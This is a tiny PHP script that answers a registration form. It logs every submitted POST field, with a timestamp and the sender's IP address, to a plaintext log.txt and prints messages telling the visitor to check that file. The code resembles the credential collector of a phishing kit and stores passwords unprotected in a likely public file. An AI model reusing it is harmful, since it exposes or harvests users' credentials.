<?php 
    var_dump('you registered');
    $handle = fopen('log.txt', 'a');

    fwrite($handle, '--------[Register]------------------------['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n"); 
    foreach ($_POST as $variable => $value) {
        fwrite($handle, $variable.': '.$value."\r\n");
    }; 
    fclose($handle); 
    var_dump('pleack check log.txt');
?>